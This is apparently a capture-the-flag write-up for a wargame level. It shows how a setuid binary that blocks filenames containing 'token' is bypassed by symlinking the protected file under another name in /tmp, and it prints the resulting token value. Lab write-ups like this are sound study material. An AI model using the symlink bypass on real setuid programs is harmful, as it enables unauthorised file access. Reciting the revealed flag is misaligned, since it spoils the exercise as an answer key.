## step 1

Logged in as `level08`. The home directory contains:

```
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```
level08 is a setuid binary owned by flag08.

There's also a token file, readable only by flag08.

Running the binary without arguments:

```
./level08
./level08 [file to read]
```
Attempting to read token directly fails:

```
./level08 token
You may not access 'token'
```
Using strings level08, we observe the binary references:

strstr()

"token"

"You may not access '%s'"
token
You may not access '%s'
Unable to open %s
Unable to read fd %d

This suggests the binary explicitly checks whether the filename string contains "token".
## step 2

The program is checking the filename string, not the actual target of the file.

This allows a symlink attack: create a symbolic link to token using a filename that doesn't contain the word "token".

Create a symlink that avoids the "token" keyword in the filename:

```
ln -s /home/user/level08/token /tmp/link
./level08 /tmp/link
quif5eloekouj29ke0vouxean

```


